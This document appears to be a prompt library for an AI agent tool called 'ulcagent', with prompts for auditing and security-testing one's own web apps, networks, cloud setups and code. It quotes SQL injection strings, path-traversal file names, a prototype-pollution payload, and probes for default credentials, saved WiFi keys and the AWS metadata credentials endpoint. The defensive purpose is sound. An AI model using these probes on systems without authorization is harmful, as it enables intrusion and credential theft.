# ulcagent Security Testing Prompt Library

Ready-to-use prompts for security testing your own products and infrastructure.
Copy-paste into ulcagent's `>>>` prompt. Replace filenames and URLs with your own.

> **Only test systems you own or have written authorization to test.**

---

## Reconnaissance & Protocol Discovery

### Identify What a Target Uses (start here)

```
>>> Write a Python script that probes https://mysite.com and reports: TLS version, cipher suite, certificate issuer and expiry, server header, X-Powered-By, supported HTTP methods (send OPTIONS), cookie flags (secure/httpOnly/sameSite), HSTS header, HTTP/2 support, and CORS policy. Output as a clean checklist.
```

```
>>> Write a script that connects to mysite.com on ports 80, 443, 8080, 8443 and for each open port reports: protocol (HTTP/HTTPS), server header, redirect behavior, and response code.
```

### SSL/TLS Deep Inspection

```
>>> Write a Python script using ssl and socket that connects to mysite.com:443 and reports: certificate chain (every cert in the chain with issuer and subject), supported TLS versions (try 1.0, 1.1, 1.2, 1.3), cipher suites offered, key exchange algorithm, certificate SANs (Subject Alternative Names), and OCSP stapling support. Flag anything weak.
```

```
>>> Write a script that checks if mysite.com is vulnerable to: SSL renegotiation attacks, BEAST, POODLE, Heartbleed (check OpenSSL version from server header), and CRIME (check if compression is enabled). Report each as safe/vulnerable.
```

### Authentication Scheme Detection

```
>>> Read all server/API files. Identify the authentication method used: JWT (check for jsonwebtoken/PyJWT imports), session cookies (check for session middleware), OAuth2 (check for oauth flows), API keys (check for header/query param auth), Basic Auth, or mTLS. Map each endpoint to its auth requirement. Flag any endpoints with no auth.
```

```
>>> Write a script that sends unauthenticated requests to every endpoint in the API and logs which return 401/403 (protected) vs 200 (unprotected). List all unprotected endpoints.
```

```
>>> Write a script that examines the Set-Cookie headers from mysite.com login response. Report: cookie name, secure flag, httpOnly flag, sameSite value, domain scope, path scope, expiration. Flag any missing security attributes.
```

### Technology Fingerprinting

```
>>> Write a Python script that fingerprints a web application at a given URL. Check: Server header, X-Powered-By, X-Generator, meta generator tag in HTML, common framework paths (/wp-admin for WordPress, /admin for Django, /__debug__ for Flask debug), favicon hash, and JavaScript library versions in page source. Report the likely tech stack.
```

```
>>> Write a script that reads the HTTP response from mysite.com and identifies: frontend framework (React/Vue/Angular from bundle names or root div), backend framework (from headers/cookies), CDN (from server header or CNAME), WAF (from blocked request patterns or headers like cf-ray), and hosting provider (from IP reverse DNS).
```

### DNS & Email Security Posture

```
>>> Write a script that queries DNS records for mysite.com using socket.getaddrinfo and subprocess nslookup/dig: A records, AAAA (IPv6), MX records, TXT records (look for SPF, DKIM, DMARC, google-site-verification), NS records, CAA records. Flag: missing SPF, missing DMARC, permissive SPF (include *), and missing CAA.
```

```
>>> Write a script that checks if mysite.com email is spoofable: parse the SPF record for -all vs ~all vs ?all, check if DMARC policy is none/quarantine/reject, check for DKIM selector. Report risk level for email spoofing.
```

### Current Connection & WiFi

```
>>> Write a script that reports the current network connection on Windows: run netsh wlan show interfaces and parse: SSID, authentication type (WPA2/WPA3/WEP/Open), cipher (AES/TKIP), channel, signal strength, BSSID. Flag WEP or Open as insecure.
```

```
>>> Write a script that lists all saved WiFi profiles on this machine (netsh wlan show profiles), then for each, retrieve the security type and saved password (netsh wlan show profile name=X key=clear). Flag any using WEP or Open, and any with weak passwords (under 12 chars).
```

```
>>> Write a script that checks the current network for: default gateway IP, gateway MAC address, whether the gateway admin panel is accessible (try http://gateway-ip), DNS servers in use (ipconfig /all), and whether DNS-over-HTTPS is enabled. Report security posture.
```

### Service & Port Discovery

```
>>> Write a Python script that scans a target IP on common service ports: 21 (FTP), 22 (SSH), 25 (SMTP), 53 (DNS), 80 (HTTP), 110 (POP3), 143 (IMAP), 443 (HTTPS), 445 (SMB), 993 (IMAPS), 1433 (MSSQL), 3306 (MySQL), 3389 (RDP), 5432 (PostgreSQL), 5900 (VNC), 6379 (Redis), 8080 (HTTP alt), 8443 (HTTPS alt), 9200 (Elasticsearch), 27017 (MongoDB). For each open port, grab the banner and check if default credentials work.
```

```
>>> Write a script that scans the local network subnet (get from ipconfig) and for each live host reports: IP, open ports (top 20), MAC address vendor, hostname if resolvable. Use threading for speed.
```

### Exposed Data & Information Leakage

```
>>> Write a script that checks mysite.com for common information leaks: /robots.txt (disallowed paths), /.env (exposed secrets), /server-status (Apache), /debug (debug panel), /.git/HEAD (git repo exposed), /phpinfo.php, /elmah.axd (.NET errors), /wp-config.php.bak, /swagger.json or /openapi.json (API docs), /graphql (GraphQL introspection). Report which are accessible.
```

```
>>> Write a script that fetches the HTML source of mysite.com and searches for: HTML comments with sensitive info, hardcoded API keys or tokens, internal IP addresses, developer email addresses, version numbers in meta tags or script URLs, and source map references (.map files). List all findings.
```

---

## Web Application Security

### Input Validation & Injection

```
>>> Read all route handlers in server.py. Check each for SQL injection, XSS, and missing input validation. List every vulnerability with line number and fix.
```

```
>>> Read the login endpoint in auth.py. Write pytest tests that send malicious payloads: SQL injection strings, script tags, oversized inputs, null bytes, and path traversal. Each test should verify the server rejects them.
```

```
>>> Read forms.py. Check every user input field for: missing length limits, missing type validation, missing sanitization. Add validation to each.
```

```
>>> Write a Python script using requests that tests https://localhost:8000/api/login for SQL injection in the email and password fields. Try common payloads: ' OR 1=1--, ' UNION SELECT--, '; DROP TABLE--. Print PASS/FAIL for each.
```

### Authentication & Session Security

```
>>> Read the auth module. Write tests for: brute force protection (10+ failed logins), session fixation, missing CSRF tokens, JWT expiration, password reset token reuse, and account enumeration via error messages.
```

```
>>> Read the session middleware. Check if sessions use: secure flag, httpOnly, SameSite attribute, proper expiration, and server-side storage. List what's missing and fix it.
```

```
>>> Read the password handling code. Check for: plaintext storage, weak hashing (MD5/SHA1), missing salt, missing pepper, bcrypt/argon2 usage, minimum password length enforcement. Fix any issues.
```

```
>>> Write a test that creates a session token, logs out, then tries to reuse the token. Verify the server rejects the expired session.
```

### HTTP Headers & Transport

```
>>> Read the app startup and middleware. Check if these security headers are set: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, Referrer-Policy, Permissions-Policy. Add any that are missing.
```

```
>>> Write a script that sends a request to https://localhost:8000 and checks the response headers against OWASP recommendations. Print a checklist of present/missing headers.
```

```
>>> Check if the app enforces HTTPS redirects. Write a test that hits HTTP and verifies it redirects to HTTPS.
```

### CORS & Cross-Origin

```
>>> Read the CORS configuration. Check if: origin is wildcarded (*), credentials are allowed with wildcard origin, methods are overly permissive, headers are unrestricted. Fix any misconfigurations.
```

```
>>> Write a script that sends requests with various Origin headers to test CORS policy: legitimate origin, malicious origin, null origin, subdomain. Report which are accepted.
```

### API Security

```
>>> Read all API endpoints. Check for: missing authentication on sensitive routes, missing rate limiting, verbose error messages that leak internals, missing pagination (DoS via large queries), and overly permissive CORS.
```

```
>>> Write a test that accesses /api/admin without authentication and verifies it returns 401. Then test with an expired token and verify it returns 403.
```

```
>>> Read the API error handlers. Check if any return stack traces, database queries, file paths, or internal IPs in error responses. Replace with generic messages.
```

```
>>> Check all API endpoints for mass assignment vulnerabilities. Look for cases where request body is passed directly to ORM create/update without whitelisting fields. Fix with explicit field lists.
```

### File Upload & Path Traversal

```
>>> Read the file upload handler. Check for: missing file type validation, missing size limits, executable file uploads, path traversal in filenames (../), and storage in publicly accessible directories. Fix each issue.
```

```
>>> Write a test that uploads files with dangerous names: ../../../etc/passwd, shell.php, test.exe, file.html. Verify the server rejects or sanitizes each.
```

### Database Security

```
>>> Read all database queries. Find any that use string formatting or concatenation instead of parameterized queries. Replace each with parameterized versions.
```

```
>>> Check the database connection config. Verify: connection uses SSL, credentials aren't hardcoded, connection pooling has limits, and the db user has minimum required privileges.
```

---

## Dependency & Supply Chain

### Package Audit

```
>>> Read requirements.txt (or package.json). For each pinned package, check if the version has known vulnerabilities. List any that should be upgraded with the safe version.
```

```
>>> Run pip audit (or npm audit) via run_bash and summarize the findings. For each vulnerability, suggest the fix.
```

```
>>> Check for unpinned dependencies in requirements.txt. Pin every package to an exact version to prevent supply chain attacks.
```

### Secret Scanning

```
>>> Search all files in this project for hardcoded secrets: API keys, passwords, tokens, connection strings, private keys. Check .env, config files, and source code. List every finding with the file and line.
```

```
>>> Check if .env is in .gitignore. Check if any committed files contain AWS keys (AKIA...), JWT secrets, database passwords, or OAuth client secrets. List findings.
```

```
>>> Read the Docker/deployment configs. Check for: secrets in environment variables visible in logs, debug mode enabled in production, exposed ports that should be internal.
```

---

## Network & Infrastructure

### Port & Service Scanning

```
>>> Write a Python script that scans localhost ports 1-1024 using socket.connect_ex. Report all open ports and try to identify the service on each (HTTP, SSH, DB, etc.).
```

```
>>> Write a script that checks if common dangerous ports are exposed: 22 (SSH), 3306 (MySQL), 5432 (PostgreSQL), 6379 (Redis), 27017 (MongoDB), 9200 (Elasticsearch). For each open port, check if it requires authentication.
```

### SSL/TLS

```
>>> Write a script using ssl and socket that connects to mysite.com:443 and reports: certificate expiration date, issuer, supported TLS versions, cipher suites. Flag any weak ciphers (RC4, DES, 3DES) or TLS < 1.2.
```

```
>>> Check if the site supports TLS 1.0 or 1.1 (deprecated). Write a test that attempts connections with each TLS version and verifies only 1.2+ succeeds.
```

### DNS & Domain

```
>>> Write a script that checks DNS records for mysite.com: SPF, DKIM, DMARC for email spoofing protection. Report which are missing or misconfigured.
```

```
>>> Check if the domain has CAA records limiting which CAs can issue certificates. Report findings.
```

---

## WiFi & Local Network

### Network Reconnaissance

```
>>> Write a Python script that discovers devices on the local network using ARP scanning (scapy or subprocess arp -a). List each device's IP, MAC address, and attempt to identify the vendor from the MAC prefix.
```

```
>>> Write a script that scans the local network (192.168.1.0/24) for devices with open web interfaces (port 80/443). Report each with its IP and any server header returned.
```

### WiFi Security

```
>>> Write a Python script that uses subprocess to run netsh wlan show profiles on Windows. For each saved WiFi network, show the security type (WPA2/WPA3/Open) and flag any using WEP or Open security.
```

```
>>> Write a script that checks the current WiFi connection for: encryption type, signal strength, channel congestion, and whether the router's admin panel is accessible on default credentials (admin/admin, admin/password).
```

```
>>> Write a script that monitors network traffic on the local interface using scapy. Flag any unencrypted HTTP traffic (not HTTPS), DNS queries to known malicious domains, and ARP spoofing attempts. Run for 60 seconds and report.
```

### Router Security

```
>>> Write a script that checks the default gateway (router) for: open admin panel on port 80/443, UPnP enabled, DNS rebinding vulnerability, and whether WPS is enabled. Report each finding with severity.
```

---

## Mobile App Security (React Native / Expo)

### Static Analysis

```
>>> Search all JS/TS files for: hardcoded API keys, embedded secrets, disabled certificate pinning, eval() usage, and insecure storage (AsyncStorage for sensitive data). List each finding.
```

```
>>> Read the app's network config. Check if: certificate pinning is enabled, HTTP (not HTTPS) endpoints are used anywhere, and debug/staging URLs are left in production code.
```

```
>>> Check the Android manifest (or app.json) for: debuggable=true, backup allowed, exported activities/services, and overly broad permissions. Fix security issues.
```

### Data Security

```
>>> Search for uses of AsyncStorage, localStorage, or SharedPreferences. Check if any store: auth tokens, passwords, PII, or encryption keys. These should use SecureStore or EncryptedSharedPreferences instead. Fix each.
```

```
>>> Read the API client code. Check if: auth tokens are sent in URL query params (visible in logs), refresh tokens are stored securely, and token expiration is handled properly.
```

---

## Automated Security Sweep

### Full Project Audit

```
>>> Run a security audit on this entire project. Check for: OWASP Top 10 vulnerabilities, hardcoded secrets, missing input validation, insecure dependencies, missing security headers, and misconfigured authentication. Write a report with severity ratings (critical/high/medium/low) for each finding.
```

### Pre-Deploy Checklist

```
>>> Read the deployment configs and source code. Verify this pre-deploy security checklist:
1. Debug mode disabled
2. No hardcoded secrets
3. All dependencies pinned and audited
4. HTTPS enforced
5. Security headers set
6. Input validation on all endpoints
7. Rate limiting enabled
8. Error messages don't leak internals
9. Logging doesn't capture sensitive data
10. CORS properly restricted
Report PASS/FAIL for each with details.
```

---

## Container & Deployment Security

### Docker

```
>>> Read the Dockerfile. Check for: running as root (no USER directive), using latest tag instead of pinned version, copying secrets into the image, unnecessary packages installed, exposed debug ports, and missing health check. Fix each issue.
```

```
>>> Read docker-compose.yml. Check for: exposed ports that should be internal-only, volumes mounting sensitive host paths, missing resource limits (memory/CPU), environment variables containing secrets (should use docker secrets), and privileged mode. Fix findings.
```

### Environment & Config

```
>>> Search the entire project for any file containing: passwords, API keys, connection strings, private keys, or tokens that are NOT in .env or environment variables. Check: source code, config files, scripts, CI configs, and READMEs. List every hardcoded secret with file and line.
```

```
>>> Read all CI/CD configs (.github/workflows/, .gitlab-ci.yml, Jenkinsfile). Check for: secrets printed in logs, artifacts containing sensitive data, unrestricted workflow triggers (pull_request_target), and missing pinned action versions (uses: action@main instead of @sha). Fix each.
```

---

## Cryptography Audit

```
>>> Search the codebase for cryptographic operations. Check for: MD5 or SHA1 used for security (should be SHA256+), ECB mode (should be GCM/CBC with proper IV), hardcoded encryption keys, weak random (random.random instead of secrets module), and custom crypto implementations. List each with severity and fix.
```

```
>>> Read the password storage code. Verify it uses: bcrypt/argon2/scrypt (not SHA256/MD5), unique salt per password, sufficient work factor (bcrypt rounds >= 12), and constant-time comparison for verification. Fix any issues.
```

```
>>> Read the JWT implementation. Check for: algorithm set to 'none' accepted, symmetric key used with HS256 (should be RS256 for multi-service), missing expiration claim, missing audience/issuer validation, secret key length (>= 256 bits), and token stored in localStorage (should be httpOnly cookie). Fix findings.
```

---

## Privacy & Data Protection

```
>>> Search the codebase for PII handling: email addresses, phone numbers, SSNs, credit card numbers, IP addresses, GPS coordinates. For each, check if it's: encrypted at rest, masked in logs, excluded from analytics/telemetry, and deletable (right to erasure). Report compliance gaps.
```

```
>>> Read the logging configuration. Check if any log statements capture: passwords, tokens, session IDs, credit card numbers, or full request bodies. Replace sensitive data in logs with redacted versions.
```

```
>>> Check the database schema. Verify that sensitive columns (password, SSN, CC number, medical data) are: encrypted at rest, not included in full-table dumps, excluded from search indexes, and access-logged. Report findings.
```

---

## Rate Limiting & Abuse Prevention

```
>>> Read the API middleware. Check if rate limiting is implemented on: login endpoint (prevent brute force), registration (prevent spam accounts), password reset (prevent email bombing), file upload (prevent resource exhaustion), and search/query endpoints (prevent scraping). Add rate limiting where missing.
```

```
>>> Write a test script that sends 100 rapid requests to the login endpoint and checks if the server starts returning 429 (Too Many Requests) after a threshold. Report the threshold and whether it's per-IP or per-account.
```

---

## Logging & Monitoring

```
>>> Read the logging setup. Verify: failed login attempts are logged with IP and timestamp, privilege escalation is logged, admin actions are logged, file access to sensitive data is logged, and log files are rotated and access-restricted. Add any missing audit logging.
```

```
>>> Write a script that parses the application logs and flags: repeated failed logins from the same IP (brute force), access to admin endpoints from non-admin IPs, requests with SQL injection patterns in parameters, and unusual request rates. Output a summary report.
```

---

## Password & Authentication Strength

### Password Policy Audit

```
>>> Read the registration and password change handlers. Check the password policy for: minimum length (should be 12+), maximum length (should allow 128+), complexity requirements (uppercase, lowercase, number, special char), dictionary word blocking, breached password checking (Have I Been Pwned API or local list), and whether the policy is enforced server-side (not just client-side validation). Report what's missing and add it.
```

```
>>> Write a test suite that tries to register accounts with weak passwords and verifies the server REJECTS each: "password", "12345678", "qwerty123", "Password1", "aaaaaaaaaa" (repeated chars), username as password, single dictionary word, and a 7-character password. Then verify it ACCEPTS: a 16-char random string, a 4-word passphrase, and a 128-char password.
```

### Password Storage Audit

```
>>> Read the user model and auth code. Find where passwords are stored. Report: hashing algorithm used (bcrypt/argon2/scrypt/SHA256/MD5/plaintext), whether each password has a unique salt, the work factor / cost parameter (bcrypt should be 12+, argon2 should use 64MB+ memory), and whether comparison uses constant-time (hmac.compare_digest or bcrypt.checkpw). Fix any issues found.
```

```
>>> Search the database migrations and schema for password-related columns. Check if: the column length can hold the hash (bcrypt needs 60 chars), old password hashes from a weaker algorithm are flagged for re-hashing on next login, and password history is tracked (prevent reuse of last N passwords). Report and fix.
```

### Brute Force & Credential Stuffing Protection

```
>>> Write a test script that simulates a brute force attack against the login endpoint: send 20 failed login attempts for the same username in 30 seconds. Verify the server: locks the account or adds progressive delays after 5 attempts, returns the same error message for wrong username vs wrong password (prevents enumeration), logs the attempts with IP address, and optionally triggers a CAPTCHA. Report which protections are present and which are missing.
```

```
>>> Read the login handler. Check for credential stuffing defenses: rate limiting per IP, rate limiting per username, device fingerprinting, geographic anomaly detection (login from new country), impossible travel detection, and whether failed attempts are logged with enough detail for incident response. Add rate limiting if missing.
```

### Password Reset Security

```
>>> Read the password reset flow. Check for: token length and randomness (should be 32+ bytes from secrets.token_urlsafe), token expiration (should be 1 hour max), single-use tokens (invalidated after use), token not leaked in URL referrer headers, old sessions invalidated after password change, notification sent to user on password change, and rate limiting on reset requests (prevent email bombing). Fix any gaps.
```

```
>>> Write tests for the password reset flow: request a reset, verify token works once, verify expired token is rejected, verify used token can't be reused, verify requesting multiple resets invalidates previous tokens, and verify changing the password logs out all other sessions.
```

### Multi-Factor Authentication

```
>>> Read the auth system. Check if MFA/2FA is: available at all, enforced for admin accounts, using TOTP (Google Authenticator) or WebAuthn (hardware keys) — not just SMS (SIM-swappable), backup codes are generated and stored hashed, and MFA can't be bypassed by hitting the API directly (skipping the UI flow). If MFA is not implemented, outline what's needed to add TOTP.
```

```
>>> Write a test that verifies: login with correct password but no MFA code returns a challenge (not a session), an invalid TOTP code is rejected, a replay of the same TOTP code is rejected (anti-replay), backup codes work exactly once, and MFA enrollment requires re-authentication.
```

### Session & Token Strength

```
>>> Read the session or JWT implementation. Check token strength: session IDs should be 128+ bits of randomness (secrets.token_hex(32)), JWT secrets should be 256+ bits, refresh tokens should be stored hashed (not plaintext), access token lifetime should be short (15 min), refresh token lifetime should be bounded (7-30 days), and token rotation should be implemented (new refresh token on each use, old one invalidated).
```

```
>>> Write a script that generates 1000 session tokens using the app's token generator and checks for: sufficient entropy (should pass NIST randomness tests), no sequential patterns, no timestamp-based predictability, and collision resistance. Report the effective bits of randomness.
```

### Login Flow Hardening

```
>>> Read the login endpoint. Check for these attack vectors: timing attacks (response time differs for valid vs invalid usernames — use constant-time comparison), username enumeration via error messages ("invalid username" vs "invalid password" should be the same message), username enumeration via registration ("email already taken"), username enumeration via password reset ("no account with that email"), and whether login is served over HTTPS only. Fix each finding.
```

```
>>> Write a timing attack test: send 100 login attempts with valid usernames and 100 with invalid usernames. Measure response times for each group. If the average differs by more than 10ms, flag a timing side-channel. Report the results.
```

---

## Continuous Security

### Regression Testing

```
>>> Read the test suite. Check if there are security-specific tests for: authentication bypass, authorization (accessing other users' data), input validation on every endpoint, and CSRF protection. Add missing security test cases.
```

```
>>> Write a GitHub Actions workflow that runs on every PR: pip audit for dependency vulnerabilities, bandit for Python security issues, a custom script checking for hardcoded secrets, and the security test suite. Fail the PR if any check fails.
```

### Post-Incident

```
>>> Write a script that checks this project for indicators of compromise: recently modified files outside normal development (check git log for unsigned commits), new or modified .env files, unexpected network connections in code (grep for requests.post to external URLs), added dependencies not in the original requirements, and backdoor patterns (eval, exec, subprocess with user input). Report any suspicious findings.
```

---

## Subtle & Overlooked Vulnerabilities

Most security checklists cover the obvious stuff. These are the ones that slip through.

### Race Conditions & TOCTOU

```
>>> Read the payment/checkout handler. Check for race conditions: can a user submit the same discount code twice simultaneously? Can they buy an item while another request is reducing the stock to zero? Write a test that sends 10 concurrent requests using threading to the same endpoint and checks for double-processing.
```

```
>>> Read the file upload handler. Check for TOCTOU (time-of-check-time-of-use): does it validate the file type, then save — with a gap where the file could be swapped? Does it check permissions then act — with a gap where permissions could change? Identify any check-then-act patterns and fix with atomic operations.
```

### Business Logic Flaws

```
>>> Read the pricing/cart/checkout code. Check for logic flaws: can a user set a negative quantity (getting credited instead of charged)? Can they modify the price client-side and have the server accept it? Can they apply a percentage discount that exceeds 100%? Can they skip payment verification by hitting the order-complete endpoint directly? Write a test for each.
```

```
>>> Read the user roles and permissions code. Check for: horizontal privilege escalation (user A accessing user B's data by changing the ID in the URL), vertical privilege escalation (regular user accessing admin endpoints by guessing the path), IDOR (Insecure Direct Object Reference — sequential IDs that can be enumerated). Write tests that verify a logged-in user CANNOT access another user's resources.
```

```
>>> Read the referral/reward/points system. Check for abuse: can a user refer themselves with a second email? Can they earn points for cancelled orders? Can they transfer points to another account and back infinitely? Can they manipulate timestamps to earn time-based bonuses early?
```

### Deserialization & Object Injection

```
>>> Search the codebase for pickle.loads, yaml.load (not safe_load), json.loads on user input that gets passed to eval or exec, unserialize (PHP), ObjectInputStream (Java), or Marshal.load (Ruby). Each is a remote code execution vector if the input comes from a user. List findings with severity and replace with safe alternatives.
```

```
>>> Search for any use of eval(), exec(), compile() on strings that include user input, query parameters, or form data. Also check for template injection: f-strings or .format() on user input that gets rendered as HTML, Jinja2 templates with autoescape disabled, or string concatenation in SQL/shell commands. Each is an injection vector.
```

### HTTP Request Smuggling & Parsing Gaps

```
>>> Write a script that sends malformed HTTP requests to mysite.com: duplicate Content-Length headers with different values, Content-Length that disagrees with Transfer-Encoding, negative Content-Length, and extremely large Content-Length with a small body. Check if the server handles each safely (reject or normalize) vs processes them (vulnerable). Report findings.
```

```
>>> Read the URL routing code. Check for path normalization issues: does /admin and /Admin and /ADMIN reach the same handler? Does /admin/ vs /admin? Does /admin%2F (URL-encoded slash)? Does /../admin bypass auth checks? Write tests for each variation against a protected endpoint.
```

### Subdomain & DNS Takeover

```
>>> Write a script that resolves all DNS CNAME records for *.mysite.com (check common subdomains: www, api, app, staging, dev, test, mail, cdn, blog, shop, admin, portal, vpn, git, ci, status). For each CNAME that points to a third-party service (AWS, Heroku, GitHub Pages, Azure, Netlify), check if the target is still claimed. Unclaimed targets are vulnerable to subdomain takeover.
```

### WebSocket Security

```
>>> Read the WebSocket handler code. Check for: authentication on WS connection (token validated on handshake, not just HTTP), origin validation (prevent cross-site WebSocket hijacking), message size limits (prevent memory exhaustion), rate limiting on messages, input validation on received messages (same injection risks as HTTP), and whether the connection downgrades to unencrypted (ws:// vs wss://). Fix any gaps.
```

### Cache Poisoning

```
>>> Read the caching configuration (Varnish, nginx, CDN, or app-level cache). Check for: responses cached with user-specific data (cache poisoning), Vary header missing for cookies/auth (one user sees another's cached data), cache keys that don't include the Host header (attackers can poison the cache with a different Host), and unkeyed headers that affect the response body (X-Forwarded-Host, X-Original-URL). Report findings.
```

### Memory & Resource Exhaustion

```
>>> Read the API handlers. Check for denial-of-service vectors that most devs miss: unbounded JSON body parsing (send a 100MB JSON), deeply nested JSON ({{{...}}} 1000 levels deep — crashes recursive parsers), regex denial of service (ReDoS — test regex patterns against catastrophic backtracking inputs like aaaa...aab), unbounded query results (SELECT * without LIMIT), and file reads without size limits. Add safeguards for each.
```

```
>>> Write a test that sends a JSON body with 100 levels of nesting to each API endpoint. Check if the server: rejects it (safe), crashes (vulnerable to stack overflow), or hangs (vulnerable to CPU exhaustion). Also test with a 10MB payload and a 1-second timeout.
```

### GraphQL-Specific (if applicable)

```
>>> Read the GraphQL schema and resolvers. Check for: introspection enabled in production (exposes entire API schema), unbounded query depth (nested queries can be exponential), missing query complexity limits, batched queries without limits (send 1000 mutations in one request), and field-level authorization (some fields may leak data to unauthorized users). Fix each finding.
```

### Server-Side Request Forgery (SSRF)

```
>>> Search for any code that fetches a URL provided by the user: requests.get(user_url), urllib.urlopen(user_input), image download from URL, webhook URL configuration, PDF generation from URL, or URL preview/unfurling. Each is a potential SSRF vector — an attacker can make your server request internal resources (http://169.254.169.254 for AWS metadata, http://localhost:6379 for Redis). Add URL validation that blocks: private IP ranges, localhost, link-local addresses, and non-HTTP schemes.
```

### Clickjacking & UI Redressing

```
>>> Write a test HTML page that embeds mysite.com in an iframe. If the site loads in the iframe, it's vulnerable to clickjacking — an attacker can overlay invisible buttons. Check if the server sends X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none'. If missing, add the headers.
```

### Dependency Confusion

```
>>> Read package.json (or requirements.txt or pyproject.toml). Check if any dependency names could be squatted on a public registry: internal package names that don't exist on npm/PyPI (an attacker could register them), packages installed from git URLs (could be redirected), and packages without integrity hashes. For npm, check for .npmrc scoping configuration.
```

### Logging Injection

```
>>> Read the logging code. Check if any log messages include unsanitized user input. An attacker can inject fake log entries (making it look like another user did something), inject ANSI escape codes (corrupting log viewers), or inject newlines to split log entries (hiding malicious activity between fake entries). Sanitize all user input before logging: strip newlines, escape ANSI, and truncate length.
```

### Second-Order Attacks

```
>>> Read the code paths where user data is stored then later used in a different context. Check for second-order SQL injection (data stored safely, but used unsafely in a later query), stored XSS (data sanitized on input but rendered raw in a different page), and stored command injection (filename or user field later used in a shell command). These pass input validation tests because the payload survives storage and fires later.
```

---

## Cloud & Infrastructure Misconfig

### AWS

```
>>> Write a script that checks for exposed AWS resources: try to list S3 buckets by common naming patterns (mysite-backups, mysite-uploads, mysite-static, mysite-logs, mysite-dev). For each that resolves, check if it allows public listing (GET /?list-type=2) or public read. Report any open buckets.
```

```
>>> Search the codebase for AWS credentials: access key patterns (AKIA followed by 16 alphanumeric chars), secret keys (40-char base64), and region/endpoint hardcoding. Also check for: IAM roles used instead of long-term keys (good), credentials in environment variables vs hardcoded (good vs bad), and whether STS temporary credentials are used for cross-account access.
```

```
>>> Write a script that checks if the AWS metadata endpoint is accessible from the application (http://169.254.169.254/latest/meta-data/). If the app makes outbound HTTP requests with user-controlled URLs (SSRF), an attacker can reach this endpoint and steal IAM role credentials. Test by requesting http://169.254.169.254/latest/meta-data/iam/security-credentials/ and report if it returns data.
```

### Azure & GCP

```
>>> Search for Azure connection strings (AccountName=...;AccountKey=...), storage account SAS tokens in URLs, and exposed Azure Blob containers. Check if any storage containers allow public anonymous access. Also check for: managed identity usage (good) vs service principal secrets in config (bad).
```

```
>>> Search for GCP service account key files (JSON with "type": "service_account"), Firebase config objects with API keys, and exposed GCS buckets. Check if any Firebase Realtime Database or Firestore has rules allowing unauthenticated read/write.
```

### Serverless & Lambda

```
>>> Read the serverless function configs (serverless.yml, SAM template, or Lambda console settings). Check for: overly permissive IAM roles (Action: * or Resource: *), environment variables containing secrets (should use Secrets Manager/Parameter Store), function timeout too high (resource exhaustion), reserved concurrency not set (account-wide DoS), and function URL without auth.
```

---

## OAuth & Third-Party Auth

### OAuth Implementation

```
>>> Read the OAuth login flow. Check for: missing state parameter (CSRF on login), state not validated on callback, authorization code used more than once, tokens leaked in URL fragments or referrer headers, redirect_uri not strictly validated (open redirect to steal tokens), scope creep (requesting more permissions than needed), and PKCE not used for public clients (mobile/SPA). Fix each finding.
```

```
>>> Write a test that initiates the OAuth flow, captures the callback URL, and replays it. The server should reject the replayed authorization code. Also test: modifying the redirect_uri parameter to an attacker domain, omitting the state parameter, and using a valid token from one user to access another user's resources.
```

### Social Login

```
>>> Read the social login handler (Google/GitHub/Facebook). Check for: email verification assumed (some providers return unverified emails), account linking vulnerabilities (attacker links their social account to victim's local account by matching email), and whether the OAuth token's audience claim is validated (prevents tokens from a different app being used).
```

### Webhook Ingress

```
>>> Read all webhook handlers (Stripe, GitHub, Slack, etc.). Check for: HMAC signature validation on the payload (prevents forged webhooks), replay protection (timestamp check — reject webhooks older than 5 minutes), idempotency handling (same webhook delivered twice shouldn't double-process), and whether the webhook endpoint is rate-limited. Fix any missing validations.
```

```
>>> Write a test that sends a webhook payload with: no signature header (should reject), wrong signature (should reject), valid signature but expired timestamp (should reject), and valid signature + timestamp (should accept). Verify all four cases.
```

---

## Git History & Source Code Secrets

```
>>> Write a script that runs git log --all --full-history -p and searches the FULL commit history (including deleted files) for: AWS keys (AKIA...), private keys (BEGIN RSA/EC PRIVATE KEY), database connection strings (postgres://... or mysql://... with passwords), JWT secrets, API tokens, and .env file contents that were committed then removed. Report each with the commit hash and date.
```

```
>>> Check if the .git directory is exposed on the live site: write a script that requests https://mysite.com/.git/HEAD and https://mysite.com/.git/config. If either returns 200, the entire source code and commit history is downloadable. Flag as critical.
```

```
>>> Check the git config for: commit signing enabled (gpg or SSH signatures), verified commits required on main branch, force push protection, and whether any git hooks enforce secret scanning pre-commit. Report what's missing and add a pre-commit hook that scans for secrets.
```

---

## Client-Side JavaScript Attacks

### Prototype Pollution

```
>>> Search all JavaScript files for: deep merge functions, lodash.merge, Object.assign with user input, JSON.parse on user-controlled strings fed into object spread, and URL query parameter parsing into objects. Each can be a prototype pollution vector where an attacker sets __proto__.isAdmin = true. Test by sending {"__proto__": {"isAdmin": true}} to each endpoint that accepts JSON. Check if subsequent requests gain admin access.
```

### postMessage Vulnerabilities

```
>>> Search all JavaScript for window.postMessage and addEventListener('message'). Check if: the message event handler validates event.origin before acting on the data, targetOrigin is set to a specific domain (not '*') on postMessage calls, and the message data is sanitized before use (DOM insertion, eval, navigation). An attacker iframe can send arbitrary messages if origin isn't checked.
```

### DOM-Based Attacks

```
>>> Search all JavaScript for: document.location, window.location, document.referrer, or URL hash values used in innerHTML, document.write, eval, setTimeout(string), or jQuery .html(). Each is a DOM-based XSS vector — the payload never touches the server, so server-side sanitization doesn't help. Fix by using textContent instead of innerHTML and avoiding eval on URL-derived data.
```

### Third-Party Script Integrity

```
>>> Read all HTML files. Find every <script src="..."> that loads from a CDN or external domain. Check if each has a Subresource Integrity (SRI) hash attribute (integrity="sha384-..."). Without SRI, a compromised CDN serves malicious code to all your users. Generate the correct SRI hash for each external script and add the integrity attribute.
```

```
>>> List every third-party script, pixel, and SDK loaded by the site: analytics (Google Analytics, Mixpanel), ads (Google Ads, Facebook Pixel), chat widgets, A/B testing, error tracking (Sentry). For each, check if it: runs in a sandboxed iframe, has Content-Security-Policy restrictions, and is loaded with SRI. Flag any that have full DOM access without SRI.
```

---

## Backup & Artifact Exposure

```
